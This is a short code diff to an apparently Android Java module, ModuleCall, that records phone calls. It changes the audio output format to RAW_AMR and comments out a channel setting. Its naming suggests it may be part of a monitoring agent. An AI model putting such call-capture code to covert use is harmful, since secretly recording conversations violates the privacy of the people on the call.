@@ -147,7 +147,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				return 0;
 			}
 
-			int outputFormat = MediaRecorder.OutputFormat.AMR_NB;
+			int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
 			int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
 
 			Long ts = new Long(System.currentTimeMillis());
@@ -362,7 +362,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		recorder.setAudioSource(audioSource);
 		recorder.setOutputFormat(outputFormat);
 		// REMOVE
-		recorder.setAudioChannels(1);
+		//recorder.setAudioChannels(1);
 		
 		recorder.setAudioEncoder(audioEncoder);
 		recorder.setOutputFile(path);
@@ -415,7 +415,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				}
 
 				// Start with strategy 1
-				int outputFormat = MediaRecorder.OutputFormat.THREE_GPP;
+				int outputFormat = MediaRecorder.OutputFormat.RAW_AMR;
 				int audioEncoder = MediaRecorder.AudioEncoder.AMR_NB;
 				boolean res;
 
